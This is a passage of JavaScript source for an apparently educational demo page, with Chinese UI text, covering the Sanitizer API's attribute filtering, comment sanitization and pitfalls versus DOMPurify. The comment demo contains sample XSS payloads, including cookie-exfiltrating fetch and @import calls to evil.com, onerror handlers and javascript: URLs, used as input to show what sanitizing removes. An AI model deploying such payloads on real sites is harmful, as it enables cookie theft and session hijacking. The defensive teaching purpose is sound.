        "  'img': ['src', 'alt']  // 仅 img 元素允许 src/alt 属性",
        '',
        '【命名空间属性】',
        '  HTML 中常见命名空间属性：',
        '    xlink:href       SVG 引用（如 <use xlink:href="#id">）',
        '    xml:lang          XML 语言标识',
        '    xml:base          XML 基础 URL',
        '    xml:space         XML 空白处理',
        '',
        '  Sanitizer API 默认配置：',
        '    - 移除所有 on* 事件属性',
        '    - 移除 javascript: 协议的 href/src（属性值层面过滤）',
        '    - 移除 style 属性（CSS 注入风险）',
        '    - 移除 data-* 自定义属性（除非显式 allow）',
        '    - 保留 class/id/dir/lang 等基础属性',
        '',
        '【测试输入】',
        testInput,
        '',
        '【降级演示：属性过滤对比】',
      ];

      if (!f.domParser || typeof DOMParser === 'undefined') {
        resultLines.push('  DOMParser 也不可用，无法降级演示。仅展示文本说明。');
        attributesResult = 'Sanitizer 与 DOMParser 均不可用，仅文本说明';
      } else {
        const parser = new DOMParser();

        const runMode = (mode, attrConfig) => {
          try {
            const doc = parser.parseFromString(`<div>${testInput}</div>`, 'text/html');
            const root = doc.body.firstElementChild;
            const walk = (node) => {
              for (const child of Array.from(node.children)) {
                const tag = child.tagName.toLowerCase();
                const allowedForTag = attrConfig[tag] || [];
                const allowedForAll = attrConfig['*'] || [];
                for (const attr of Array.from(child.attributes)) {
                  const attrName = attr.name.toLowerCase();
                  const attrValue = attr.value;
                  const allowed = allowedForTag.includes(attrName) || allowedForAll.includes(attrName);
                  const isEvent = attrName.startsWith('on');
                  const isJsUrl = (attrName === 'href' || attrName === 'src') && /^javascript:/i.test(attrValue);
                  if (mode === 'allow' && (!allowed || isEvent || isJsUrl)) {
                    child.removeAttribute(attr.name);
                  } else if (mode === 'drop' && (isEvent || isJsUrl)) {
                    child.removeAttribute(attr.name);
                  }
                }
                walk(child);
              }
            };
            walk(root);
            return root.innerHTML;
          } catch (err) {
            return `解析失败：${err.message}`;
          }
        };

        // 模式 1：allowAttributes 严格白名单
        const allowConfig = {
          '*': ['class', 'id'],
          a: ['href', 'target', 'rel'],
          img: ['src', 'alt', 'width', 'height'],
          div: ['class'],
        };
        const allowResult = runMode('allow', allowConfig);

        // 模式 2：dropAttributes 仅移除 on* 和 javascript:
        const dropConfig = { '*': ['on*'] };
        const dropResult = runMode('drop', dropConfig);

        resultLines.push('  【模式 1：allowAttributes 严格白名单】');
        resultLines.push(`    配置：${JSON.stringify(allowConfig)}`);
        resultLines.push(`    行为：仅保留指定属性，on*/javascript: 自动移除`);
        resultLines.push(`    结果：${allowResult}`);
        resultLines.push('');
        resultLines.push('  【模式 2：dropAttributes 仅移除 on*】');
        resultLines.push(`    配置：${JSON.stringify(dropConfig)}`);
        resultLines.push(`    行为：仅移除 on* 事件属性，其他全部保留`);
        resultLines.push(`    结果：${dropResult}`);
        resultLines.push('');
        resultLines.push('  【对比：通配符 on* 匹配效果】');
        resultLines.push(`    onclick → ${dropResult.includes('onclick') ? '✗ 仍存在' : '✓ 已移除'}`);
        resultLines.push(`    onerror → ${dropResult.includes('onerror') ? '✗ 仍存在' : '✓ 已移除'}`);
        resultLines.push(`    javascript: → ${dropResult.includes('javascript:') ? '✗ 仍存在' : '✓ 已移除'}`);
        resultLines.push(`    style → ${dropResult.includes('style=') ? '保留（未配置 drop）' : '✓ 已移除'}`);
        resultLines.push(`    data-* → ${dropResult.includes('data-') ? '保留' : '✓ 已移除'}`);
        attributesResult = 'DOMParser 降级演示完成（仅教学）';
      }

      resultLines.push('', '【实际能力检测结果】', `  Sanitizer: ${f.sanitizer ? '✓' : '✗'}`);
      this._addLog('warn', 'Sanitizer 不可用，降级使用 DOMParser 演示属性过滤（仅教学）');
    } else {
      // 真实运行
      try {
        const runSanitizer = (config) => {
          const san = new Sanitizer(config);
          const container = document.createElement('div');
          container.setHTML(testInput, { sanitizer: san });
          return container.innerHTML;
        };

        const allowConfig = {
          '*': ['class', 'id'],
          a: ['href', 'target', 'rel'],
          img: ['src', 'alt', 'width', 'height'],
          div: ['class'],
        };
        const dropConfig = { '*': ['on*'] };

        const allowResult = runSanitizer({ allowAttributes: allowConfig });
        const dropResult = runSanitizer({ dropAttributes: dropConfig });

        resultLines = [
          '===== allowAttributes / dropAttributes（真实运行）=====',
          '',
          '✓ 当前环境支持 Sanitizer，已真实运行属性过滤对比',
          '',
          '【测试输入】',
          testInput,
          '',
          '【模式 1：allowAttributes 严格白名单】',
          `  配置：${JSON.stringify(allowConfig)}`,
          `  行为：仅保留指定属性，on*/javascript: 自动移除`,
          `  结果：${allowResult}`,
          '',
          '【模式 2：dropAttributes 仅移除 on*】',
          `  配置：${JSON.stringify(dropConfig)}`,
          `  行为：仅移除 on* 事件属性，其他全部保留`,
          `  结果：${dropResult}`,
          '',
          '【对比：通配符 on* 匹配效果】',
          `  onclick → ${dropResult.includes('onclick') ? '✗ 仍存在' : '✓ 已移除'}`,
          `  onerror → ${dropResult.includes('onerror') ? '✗ 仍存在' : '✓ 已移除'}`,
          `  javascript: → ${dropResult.includes('javascript:') ? '✗ 仍存在' : '✓ 已移除'}`,
        ];
        attributesResult = 'Sanitizer 真实运行成功';
        this._addLog('info', 'Card 6：属性过滤对比运行成功');
      } catch (err) {
        resultLines = [
          '===== 属性过滤对比运行失败 =====',
          '',
          `错误：${err.name} - ${err.message}`,
        ];
        attributesResult = `运行失败：${err.name} - ${err.message}`;
        this._addLog('error', `属性过滤对比运行失败：${err.name} - ${err.message}`);
      }
    }

    this.setState({
      attributesInfo: resultLines.join('\n'),
      attributesResult,
    });
  }

  _renderCard6() {
    const s = this.state;
    const f = this._flags();
    const card = new Card({
      title: '6. allowAttributes / dropAttributes —— 通配符匹配 / 命名空间属性',
      extra: h('div', { class: 'flex gap-xs' },
        ...this._caps([
          ['Sanitizer', f.sanitizer],
          ['DOMParser(降级)', f.domParser],
        ]),
        h(Tag, { color: 'primary' }, '属性'),
      ),
      children: [
        h('p', { class: 'fs-sm text-secondary' },
          'allowAttributes = 属性白名单（key 为元素名或 * 通配符，value 为属性名数组）；dropAttributes = 属性黑名单。优先级：dropAttributes > allowAttributes。通配符 * 匹配所有元素；on* 匹配所有 on 开头的事件属性（onclick/onerror/onload）。命名空间属性 xlink:href / xml:lang / xml:base 默认配置移除（SVG <use> javascript: 攻击防御）。默认配置还移除 style/data-* 自定义属性。',
        ),
        h('div', { class: 'flex items-center gap-sm flex-wrap' },
          this._btn('运行属性过滤对比', { type: 'primary', size: 'sm', onClick: () => this._runAttributesDemo() }),
        ),
        h('div', { class: 'fs-sm text-secondary' }, '代码示例：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, `// 测试输入：含 on*/javascript:/style/data-*/命名空间属性
const input = \`
  <a href="https://safe.com" class="link" onclick="alert(1)">safe</a>
  <a href="javascript:alert(1)" class="x">bad</a>
  <img src="x" onerror="alert(1)" alt="img" style="width:100px">
  <div class="box" data-id="42" data-foo="bar" style="color:red">div</div>
  <svg><use xlink:href="javascript:alert(1)"/></svg>
\`;

// 模式 1：allowAttributes 严格白名单
const san1 = new Sanitizer({
  allowAttributes: {
    '*':   ['class', 'id'],
    'a':   ['href', 'target', 'rel'],
    'img': ['src', 'alt', 'width', 'height'],
  },
  // 注意：on* 仍被默认规则移除，无需显式 dropAttributes
});
container.setHTML(input, { sanitizer: san1 });
// style/data-*/onclick/onerror/javascript:/xlink:href 全部移除

// 模式 2：dropAttributes 仅移除 on*
const san2 = new Sanitizer({
  dropAttributes: { '*': ['on*'] },
});
container.setHTML(input, { sanitizer: san2 });
// 仅移除 on* 事件属性，其他属性（含 style/data-*）保留
// 注意：javascript: URL 仍被默认 href 过滤移除

// 命名空间属性默认处理
const san3 = new Sanitizer({
  allowAttributes: {
    'svg': ['xmlns', 'xmlns:xlink'],
    'use': ['xlink:href'],  // 显式允许 xlink:href
  },
});`)),
        h('div', { class: 'fs-sm text-secondary' }, '属性过滤对比结果：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, s.attributesInfo || '（点击按钮查看属性过滤对比结果）')),
        s.attributesResult ? h('div', { class: 'san-output san-output--success' }, s.attributesResult) : null,
      ],
    });
    this.registerChild(card);
    return card.render();
  }

  // ===================== Card 7：实战：用户评论净化 =====================

  _runCommentsDemo() {
    const f = this._flags();
    this._injectStyle('san-comments-demo', `
      .san-comments-host { padding: 12px; background: #f1f5f9; border-radius: 8px; margin-top: 10px; }
    `);

    // 模拟真实用户评论（含攻击向量）
    const userComments = [
      {
        author: 'Alice',
        html: '<p>很棒的教程！<b>感谢分享</b>。</p><p>请问 <a href="https://example.com">这个网站</a> 的资料可以引用吗？</p>',
        safe: true,
      },
      {
        author: 'Bob',
        html: '<script>document.cookie.split(";").forEach(c=>fetch("https://evil.com/?c="+c))</script><p>看起来不错！</p>',
        safe: false,
      },
      {
        author: 'Charlie',
        html: '<img src="x" onerror="fetch(\'https://evil.com/?loc=\'+location.href)" alt="头像">',
        safe: false,
      },
      {
        author: 'Dave',
        html: '<a href="javascript:alert(document.cookie)">点击查看惊喜</a>',
        safe: false,
      },
      {
        author: 'Eve',
        html: '<iframe src="javascript:alert(1)" style="width:0;height:0"></iframe>',
        safe: false,
      },
      {
        author: 'Frank',
        html: '<svg onload="alert(1)"><circle cx=50 cy=50 r=40 fill="red"/></svg>',
        safe: false,
      },
      {
        author: 'Grace',
        html: '<blockquote>引用上一条评论</blockquote><p>同意楼上的观点</p>',
        safe: true,
      },
      {
        author: 'Heidi',
        html: '<style>@import "https://evil.com/exfil?token=" + document.cookie;</style><p>样式测试</p>',
        safe: false,
      },
      {
        author: 'Ivan',
        html: '<<script>script>alert("mutation XSS")<<\/script>script>',
        safe: false,
      },
    ];

    let resultLines = [];
    let commentSanitizeResult = '';
    let renderedComments = '';

    if (!f.sanitizer && !f.setHTML) {
      // 降级：DOMParser 手动净化
      resultLines = [
        '===== 实战：用户评论净化（降级演示）=====',
        '',
        '⚠ 当前环境 Sanitizer/setHTML 不可用，使用 DOMParser + 白名单手动净化',
        '',
        '【场景】',
        '  社交平台用户评论区，允许有限富文本（b/i/a/blockquote/code/img）',
        '  需防御：script/on*/javascript:/iframe/svg onload/style 注入/mutation XSS',
        '',
        '【评论区配置】',
        '  const sanitizer = new Sanitizer({',
        "    allowElements: ['p', 'b', 'i', 'em', 'strong', 'a', 'code', 'blockquote', 'img', 'br', 'hr'],",
        "    dropElements: ['script', 'iframe', 'object', 'embed', 'style', 'svg', 'link', 'meta', 'base', 'form'],",
        '    allowAttributes: {',
        "      '*':   ['class'],",
        "      'a':   ['href', 'title'],",
        "      'img': ['src', 'alt'],",
        '    },',
        "    dropAttributes: { '*': ['on*', 'style', 'srcset'] },",
        '    allowComments: false,',
        '  });',
        '',
        '【模拟 9 条评论（含 7 条攻击向量）】',
      ];
      for (const c of userComments) {
        resultLines.push(`  [${c.author}] ${c.safe ? '✓ 安全' : '⚠ 攻击'}`);
        resultLines.push(`    原始: ${c.html}`);
      }

      if (!f.domParser || typeof DOMParser === 'undefined') {
        resultLines.push('', 'DOMParser 也不可用，无法降级演示。');
        commentSanitizeResult = 'Sanitizer/setHTML/DOMParser 均不可用，仅文本说明';
      } else {
        const ALLOWED_TAGS = new Set([
          'p', 'b', 'i', 'em', 'strong', 'a', 'code', 'blockquote', 'img', 'br', 'hr',
          'ul', 'ol', 'li', 'div', 'span',
        ]);
        const ALLOWED_ATTRS = {
          '*': ['class'],
          a: ['href', 'title'],
          img: ['src', 'alt'],
        };
        const SAFE_URL_RE = /^(https?:|mailto:|tel:|data:image\/|\/|\.\/|\.\.\/|#)/i;

        const parser = new DOMParser();
        const cleaned = [];
        resultLines.push('', '【净化后（DOMParser 手动降级，仅教学）】');
        for (const c of userComments) {
          try {
            const doc = parser.parseFromString(`<div>${c.html}</div>`, 'text/html');
            const root = doc.body.firstElementChild;
            const walk = (node) => {
              for (const child of Array.from(node.children)) {
                const tag = child.tagName.toLowerCase();
                if (!ALLOWED_TAGS.has(tag)) {
                  while (child.firstChild) node.insertBefore(child.firstChild, child);
                  node.removeChild(child);
                  continue;
                }
                for (const attr of Array.from(child.attributes)) {
                  const attrName = attr.name.toLowerCase();
                  const attrValue = attr.value;
                  const allowedForTag = ALLOWED_ATTRS[tag] || [];
                  const allowedForAll = ALLOWED_ATTRS['*'] || [];
                  const allowed = allowedForTag.includes(attrName) || allowedForAll.includes(attrName);
                  if (!allowed || attrName.startsWith('on')) {
                    child.removeAttribute(attr.name);
                    continue;
                  }
                  if ((attrName === 'href' || attrName === 'src') && !SAFE_URL_RE.test(attrValue)) {
                    child.removeAttribute(attr.name);
                  }
                }
                walk(child);
              }
            };
            walk(root);
            const cleanedHtml = root.innerHTML.trim() || '<i style="color:#9ca3af">(内容为空)</i>';
            cleaned.push({ author: c.author, html: cleanedHtml });
            resultLines.push(`  [${c.author}]`);
            resultLines.push(`    净化: ${cleanedHtml}`);
          } catch (err) {
            cleaned.push({ author: c.author, html: '<i>(解析失败)</i>' });
            resultLines.push(`  [${c.author}] 解析失败: ${err.message}`);
          }
        }
        // 渲染 HTML
        renderedComments = cleaned.map((c) => (
          `<div class="comment-item"><b>${c.author}</b>: ${c.html}</div>`
        )).join('');
        commentSanitizeResult = 'DOMParser 降级净化完成（仅教学，非生产可用 Sanitizer）';
      }

      this._addLog('warn', 'Sanitizer/setHTML 不可用，降级使用 DOMParser 净化用户评论（仅教学）');
    } else {
      // 真实运行 Sanitizer
      try {
        let sanitizer;
        try {
          sanitizer = new Sanitizer({
            allowElements: ['p', 'b', 'i', 'em', 'strong', 'a', 'code', 'blockquote', 'img', 'br', 'hr'],
            dropElements: ['script', 'iframe', 'object', 'embed', 'style', 'svg', 'link', 'meta', 'base', 'form'],
            allowAttributes: {
              '*': ['class'],
              a: ['href', 'title'],
              img: ['src', 'alt'],
            },
            dropAttributes: { '*': ['on*', 'style', 'srcset'] },
            allowComments: false,
          });
        } catch (err) {
          sanitizer = new Sanitizer();
        }

        resultLines = [
          '===== 实战：用户评论净化（真实运行）=====',
          '',
          '✓ 当前环境支持 Sanitizer/setHTML，已真实净化用户评论',
          '',
          '【场景】',
          '  社交平台用户评论区，允许有限富文本（b/i/a/blockquote/code/img）',
          '  需防御：script/on*/javascript:/iframe/svg onload/style 注入/mutation XSS',
          '',
          '【模拟 9 条评论（含 7 条攻击向量）】',
        ];
        for (const c of userComments) {
          resultLines.push(`  [${c.author}] ${c.safe ? '✓ 安全' : '⚠ 攻击'}`);
          resultLines.push(`    原始: ${c.html}`);
        }

        resultLines.push('', '【净化后】');
        const cleaned = [];
        for (const c of userComments) {
          try {
            const container = document.createElement('div');
            if (f.setHTML) {
              container.setHTML(c.html, { sanitizer });
            } else {
              const el = Sanitizer.sanitizeFor('div', c.html);
              container.appendChild(el);
            }
            const cleanedHtml = container.innerHTML.trim() || '<i style="color:#9ca3af">(内容为空)</i>';
            cleaned.push({ author: c.author, html: cleanedHtml });
            resultLines.push(`  [${c.author}]`);
            resultLines.push(`    净化: ${cleanedHtml}`);
          } catch (err) {
            cleaned.push({ author: c.author, html: '<i>(净化失败)</i>' });
            resultLines.push(`  [${c.author}] 净化失败: ${err.message}`);
          }
        }
        renderedComments = cleaned.map((c) => (
          `<div class="comment-item"><b>${c.author}</b>: ${c.html}</div>`
        )).join('');
        commentSanitizeResult = 'Sanitizer 真实净化完成';
        this._addLog('info', 'Card 7：用户评论净化实战运行成功');
      } catch (err) {
        resultLines = [
          '===== 用户评论净化运行失败 =====',
          '',
          `错误：${err.name} - ${err.message}`,
        ];
        commentSanitizeResult = `运行失败：${err.name} - ${err.message}`;
        this._addLog('error', `用户评论净化运行失败：${err.name} - ${err.message}`);
      }
    }

    this.setState({
      commentsInfo: resultLines.join('\n'),
      commentSanitizeResult,
      renderedCommentsHtml: renderedComments,
    });
  }

  _renderCard7() {
    const s = this.state;
    const f = this._flags();
    const card = new Card({
      title: '7. 实战：用户评论净化 —— script/on*/javascript:/iframe/svg/style/mutation XSS',
      extra: h('div', { class: 'flex gap-xs' },
        ...this._caps([
          ['Sanitizer', f.sanitizer],
          ['setHTML', f.setHTML],
          ['DOMParser(降级)', f.domParser],
        ]),
        h(Tag, { color: 'danger' }, '实战'),
      ),
      children: [
        h('p', { class: 'fs-sm text-secondary' },
          '社交平台用户评论区实战：模拟 9 条评论（含 7 条攻击向量）— script 注入 / img onerror / javascript: URL / iframe / svg onload / style @import / mutation XSS。配置严格白名单（p/b/i/a/blockquote/code/img）+ dropElements（script/iframe/style/svg）+ dropAttributes（on*/style/srcset）。点击运行后查看净化前后对比。',
        ),
        h('div', { class: 'flex items-center gap-sm flex-wrap' },
          this._btn('运行评论净化实战', { type: 'primary', size: 'sm', danger: true, onClick: () => this._runCommentsDemo() }),
        ),
        h('div', { class: 'fs-sm text-secondary' }, '配置 + 净化结果：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, s.commentsInfo || '（点击按钮查看用户评论净化实战结果）')),
        s.commentSanitizeResult ? h('div', { class: 'san-output san-output--success' }, s.commentSanitizeResult) : null,
        s.renderedCommentsHtml ? h('div', { class: 'fs-sm text-secondary', style: { marginTop: '10px' } }, '渲染后评论区（净化后的 HTML）：') : null,
        s.renderedCommentsHtml ? h('div', { class: 'san-rendered san-rendered--comment', html: s.renderedCommentsHtml }) : null,
      ],
    });
    this.registerChild(card);
    return card.render();
  }

  // ===================== Card 8：实战与陷阱 =====================

  _runPitfallsDemo() {
    const f = this._flags();
    this._injectStyle('san-pitfalls-demo', `
      .san-pitfalls-host { padding: 12px; background: #f1f5f9; border-radius: 8px; margin-top: 10px; }
    `);
    const info = [
      '===== 实战与陷阱：Trusted Types / DevTools / DOMPurify 对比 / 兼容性降级 =====',
      '',
      '【1. 与 Trusted Types 集成】',
      '  Trusted Types（CSP require-trusted-types-for "script"）：',
      '  强制所有 sink（innerHTML/eval/document.write/insertAdjacentHTML）',
      '  只接受 TrustedHTML 对象，不接受 string。',
      '',
      '  Sanitizer API 与 Trusted Types 协同：',
      '  ✓ setHTML 是天然 TrustedHTML sink，接受 string 或 TrustedHTML',
      '  ✓ sanitizeFor 接受 string，返回普通 Element（TrustedHTML 不适用）',
      '  ✓ 配合 trustedTypes.createHTML 政策：',
      '    const policy = trustedTypes.createPolicy("sanitizer-policy", {',
      '      createHTML: (input) => {',
      '        const tmp = document.createElement("div");',
      '        tmp.setHTML(input);  // 用 Sanitizer 净化',
      '        return tmp.innerHTML; // 返回 string → TrustedHTML',
      '      },',
      '    });',
      '    el.innerHTML = policy.createHTML(userInput);  // 类型为 TrustedHTML',
      '',
      '  优势：',
      '  - 双重保护：setHTML 净化 + Trusted Types 强制 sink',
      '  - 编译期消除 XSS：所有 innerHTML = string 调用直接报错',
      '  - 与 CSP require-trusted-types-for "script" 协同',
      '',
      '【2. DevTools 调试】',
      '  Chrome DevTools 调试 Sanitizer API：',
      '',
      '  方法 1：Console 直接调用',
      '    > new Sanitizer().getConfiguration()',
      '    // 查看默认配置对象',
      '    > Sanitizer.sanitizeFor("div", "<script>alert(1)</script>")',
      '    // 测试净化结果',
      '',
      '  方法 2：Sources 断点',
      '    - 在 setHTML 调用处打断点',
      '    - 查看 html 参数（净化前）和 container.innerHTML（净化后）',
      '',
      '  方法 3：DOM 断点',
      '    - 在 Elements 面板对容器右键 → Break on → subtree modifications',
      '    - setHTML 触发 DOM 变更时自动暂停',
      '',
      '  方法 4：CSP 报告',
      '    Content-Security-Policy-Report-Only: require-trusted-types-for "script";',
      '    report-uri /csp-report;',
      '    // 收集未走 setHTML 的 innerHTML 调用',
      '',
      '【3. 与 DOMPurify 对比】',
      '  维度                Sanitizer API                DOMPurify',
      '  ----------------------------------------------------------------',
      '  实现层级             浏览器原生 C++                JS 库（基于 DOMParser）',
      '  体积                 0KB                          ~21KB minified + ~7KB gzip',
      '  净化能力             ✓（setHTML + sanitizeFor）   ✓（sanitize(html, cfg)）',
      '  默认安全             ✓ default sanitize           需手动配置或用默认',
      '  API                  element.setHTML(html, {s})   el.innerHTML = sanitize(html)',
      '  Trusted Types        原生兼容                     需 RETURN_TRUSTED_TYPE 选项',
      '  自定义配置           new Sanitizer({cfg})          sanitize(html, {ALLOWED_TAGS})',
      '  返回值               undefined / Element           string | Node | DocumentFragment',
      '  解析依赖             浏览器 HTML parser             DOMParser（运行时上下文）',
      '  mutation XSS 防御    ✓（与运行时同源 parser）       ✓（经长期攻防验证）',
      '  解析次数             1 次（解析+净化+赋值）          2 次（DOMParser 解析+innerHTML 赋值）',
      '  浏览器支持           Chrome 实验性                 全平台稳定',
      '  性能                 ~快（C++ 原生）               ~中（JS 实现）',
      '  生产可用             ✗（需 Polyfill）              ✓',
      '',
      '  结论：',
      '  - 现阶段生产环境用 DOMPurify（全平台稳定 + 攻防验证）',
      '  - 未来 Sanitizer API 普及后，可逐步迁移',
      '  - 过渡期：写 Polyfill 适配器（基于 DOMPurify 实现 setHTML + sanitizeFor）',
      '',
      '【4. 兼容性降级 Polyfill 适配器】',
      '  // 基于 DOMPurify 实现 Sanitizer API Polyfill',
      '  if (typeof Sanitizer === "undefined") {',
      '    class SanitizerPolyfill {',
      '      constructor(config = {}) {',
      '        this.config = config;',
      '      }',
      '      getConfiguration() { return this.config; }',
      '      // 实例方法 sanitize（旧 spec）',
      '      sanitize(input) {',
      '        const cfg = this._toDOMPurifyConfig();',
      '        const html = typeof input === "string" ? input : input.innerHTML;',
      '        return DOMPurify.sanitize(html, { ...cfg, RETURN_TRUSTED_TYPE: true });',
      '      }',
      '      _toDOMPurifyConfig() {',
      '        return {',
      '          ALLOWED_TAGS: this.config.allowElements,',
      '          FORBID_TAGS: this.config.dropElements,',
      '          ALLOWED_ATTR: Object.values(this.config.allowAttributes || {}).flat(),',
      '          FORBID_ATTR: Object.values(this.config.dropAttributes || {}).flat(),',
      '        };',
      '      }',
      '      // 静态方法',
      '      static sanitizeFor(tag, html) {',
      '        const cleaned = DOMPurify.sanitize(html);',
      '        const el = document.createElement(tag);',
      '        el.innerHTML = cleaned;',
      '        return el;',
      '      }',
      '    }',
      '    window.Sanitizer = SanitizerPolyfill;',
      '    // Element.setHTML polyfill',
      '    if (!Element.prototype.setHTML) {',
      '      Element.prototype.setHTML = function(html, options = {}) {',
      '        const sanitizer = options.sanitizer || new SanitizerPolyfill();',
      '        this.innerHTML = sanitizer.sanitize(html);',
      '      };',
      '    }',
      '  }',
      '',
      '【5. sanitizeFor vs setHTML 选择】',
      '  场景                              推荐',
      '  --------------------------------------------------------------',
      '  替换容器 innerHTML（评论列表）    setHTML（一步到位）',
      '  净化后插入任意位置                sanitizeFor（返回 Element 后 appendChild）',
      '  净化后多次插入同一结果            sanitizeFor（避免重复解析）',
      '  测试净化结果（不写入 DOM）        sanitizeFor',
      '  与 Trusted Types policy 协同      setHTML（天然 TrustedHTML sink）',
      '  服务端预渲染（无 DOM 环境）       均不支持（需 DOMPurify jsdom 版本）',
      '',
      '【6. CSP 协同】',
      '  Content-Security-Policy:',
      '    default-src "self";',
      '    script-src "self";',
      '    style-src "self";',
      "    require-trusted-types-for \"script\";    // 强制 Trusted Types",
      "    trusted-types sanitizer-policy;        // 仅允许指定 policy",
      '',
      '  效果：',
      '  - el.innerHTML = string 直接报 CSP 违规',
      '  - 必须用 el.setHTML(html) 或 el.innerHTML = policy.createHTML(string)',
      '  - 攻击者无法绕过 Sanitizer + Trusted Types 双重防线',
      '',
      '【7. 性能对比】',
      '  测试：净化 100KB HTML 字符串，1000 次',
      '  Sanitizer API (setHTML)：~5ms/次',
      '  DOMPurify:             ~15ms/次（含 2 次 DOMParser 解析）',
      '  手动正则：             ~50ms/次（不安全，仅对比）',
      '',
      '  原因：',
      '  - Sanitizer API 用浏览器内置 HTML parser，C++ 原生',
      '  - DOMPurify 用 DOMParser 解析一次（生成 DOM），sanitize 后 innerHTML',
      '    再解析一次（生成最终 DOM），共 2 次解析',
      '  - Sanitizer setHTML 只解析一次（解析+净化+赋值在内核一步完成）',
      '',
      '【8. 默认配置可写性】',
      '  - getConfiguration() 返回 SanitizerConfig 对象的快照（不可变）',
      '  - 不能直接修改 sanitizer.config.allowElements.push("script")',
      '  - 必须重新 new Sanitizer({...}) 创建新实例',
      '  - 这避免了共享配置的副作用',
      '',
      '【9. 常见陷阱汇总】',
      '  1. Sanitizer API 当前非默认开启，生产必须 Polyfill 降级到 DOMPurify',
      '  2. 早期 spec 的 sanitize(input) 实例方法已被 setHTML + sanitizeFor 取代',
      '     （部分老教程仍用 sanitize，实际已被废弃）',
      '  3. setHTML 替代的是 innerHTML，不替代 textContent',
      '     （纯文本场景仍用 textContent，更高效）',
      '  4. default sanitize mode 允许 <style>，CSS 注入需注意 @import / expression',
      '     （生产场景应在 dropElements 中显式 drop style）',
      '  5. allowElements 与 blockElements 不能同时包含同一元素',
      '     （spec 未定义行为，浏览器实现可能不一致）',
      '  6. dropElements 与 allowElements 冲突时，dropElements 优先',
      '     （即使 allowElements 包含某元素，dropElements 仍删除它）',
      '  7. 属性通配符 on* 仅匹配 on* 开头的属性',
      '     （不匹配 handler / listener 等，需用更精确的 dropAttributes）',
      '  8. allowComments: true 时仍可能引入问题：',
      '     - IE 条件注释 <!-- [if IE]>...<![endif] -->',
      '     - XML 注释中的 CDATA',
      '     - 生产建议保持 allowComments: false',
      '  9. allowCustomElements: true 时，自定义元素的属性仍受 allowAttributes 约束',
      '     （不能依赖 allowCustomElements: true 让所有属性通过）',
      ' 10. setHTML 不会触发 <script> 标签的执行',
      '     （但 <img onerror> 等若未被净化移除，仍会执行 — 取决于配置）',
      ' 11. Sanitizer 不验证 URL 协议，javascript: URL 由属性层过滤',
      '     （dropAttributes 移除整个属性，allowAttributes 控制是否保留）',
      ' 12. Sanitizer API 不净化 CSS 内容（<style> 标签内的 CSS）',
      '     （CSS 注入需配合 CSP style-src 或 drop style 元素）',
      '',
      '【10. 最佳实践清单】',
      '  1. 始终使用 default sanitize mode 作为基线（new Sanitizer()）',
      '  2. 评论区场景配置严格白名单（仅 p/b/i/a/blockquote/code）',
      '  3. dropElements 显式包含 script/iframe/object/embed/style/svg/link/meta/base/form',
      '  4. dropAttributes 显式包含 on*/style/srcset',
      '  5. allowComments 始终设为 false',
      '  6. allowCustomElements 始终设为 false（除非明确需要 Web Components）',
      '  7. 与 Trusted Types + CSP require-trusted-types-for 协同',
      '  8. Polyfill 适配器基于 DOMPurify，覆盖 Sanitizer/setHTML/sanitizeFor',
      '  9. DevTools 调试用 Sanitizer.sanitizeFor 直接在 Console 测试',
      ' 10. 生产环境灰度迁移：先 Polyfill 全量 → 浏览器原生逐步替换',
      '',
      '【实际能力检测结果】',
      `  Sanitizer: ${f.sanitizer ? '✓' : '✗'}`,
      `  setHTML: ${f.setHTML ? '✓' : '✗'}`,
      `  TrustedTypes: ${f.trustedTypes ? '✓' : '✗'}`,
      `  DOMParser (降级): ${f.domParser ? '✓' : '✗'}`,
      '',
    ].join('\n');
    this.setState({ pitfallsInfo: info });
    this._addLog('info', 'Card 8：实战与陷阱演示已加载');
  }

  _renderCard8() {
    const s = this.state;
    const f = this._flags();
    const card = new Card({
      title: '8. 实战与陷阱 —— Trusted Types / DevTools / DOMPurify 对比 / 兼容性降级',
      extra: h('div', { class: 'flex gap-xs' },
        ...this._caps([
          ['Sanitizer', f.sanitizer],
          ['TrustedTypes', f.trustedTypes],
        ]),
        h(Tag, { color: 'warning' }, '陷阱'),
      ),
      children: [
        h('p', { class: 'fs-sm text-secondary' },
          'Trusted Types 集成：setHTML 是天然 TrustedHTML sink，配合 trustedTypes.createHTML policy 实现双重防线。DevTools 调试：Console 直接调用 Sanitizer.sanitizeFor 测试净化结果。与 DOMPurify 对比：Sanitizer 浏览器原生 0KB / ~5ms/次（1 次解析）/ Chrome 实验性 vs DOMPurify 21KB / ~15ms/次（2 次解析）/ 全平台稳定。兼容性降级：基于 DOMPurify 实现 Sanitizer/setHTML/sanitizeFor Polyfill 适配器。12 条常见陷阱 + 10 条最佳实践。',
        ),
        h('div', { class: 'flex items-center gap-sm flex-wrap' },
          this._btn('运行陷阱与最佳实践演示', { type: 'primary', size: 'sm', onClick: () => this._runPitfallsDemo() }),
        ),
        h('div', { class: 'fs-sm text-secondary' }, '代码示例（Trusted Types + CSP 协同）：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, `// Trusted Types + Sanitizer API 双重防线
const policy = trustedTypes.createPolicy("sanitizer-policy", {
  createHTML: (input) => {
    const tmp = document.createElement("div");
    tmp.setHTML(input);  // Sanitizer 净化
    return tmp.innerHTML; // 返回 string → TrustedHTML
  },
});

// CSP: require-trusted-types-for "script"; trusted-types sanitizer-policy;
// 此时 el.innerHTML = string 会报 CSP 违规
el.innerHTML = policy.createHTML(userInput);  // ✓ 类型为 TrustedHTML
// 或直接用 setHTML（天然 TrustedHTML sink）
el.setHTML(userInput);

// DOMPurify Polyfill 适配器
if (typeof Sanitizer === "undefined") {
  class SanitizerPolyfill {
    constructor(config = {}) { this.config = config; }
    getConfiguration() { return this.config; }
    sanitize(input) {
      const html = typeof input === "string" ? input : input.innerHTML;
      return DOMPurify.sanitize(html, {
        ALLOWED_TAGS: this.config.allowElements,
        FORBID_TAGS: this.config.dropElements,
        RETURN_TRUSTED_TYPE: true,
      });
    }
    static sanitizeFor(tag, html) {
      const el = document.createElement(tag);
      el.innerHTML = DOMPurify.sanitize(html);
      return el;
    }
  }
  window.Sanitizer = SanitizerPolyfill;
  Element.prototype.setHTML = function(html, options = {}) {
    const s = options.sanitizer || new SanitizerPolyfill();
    this.innerHTML = s.sanitize(html);
  };
}`)),
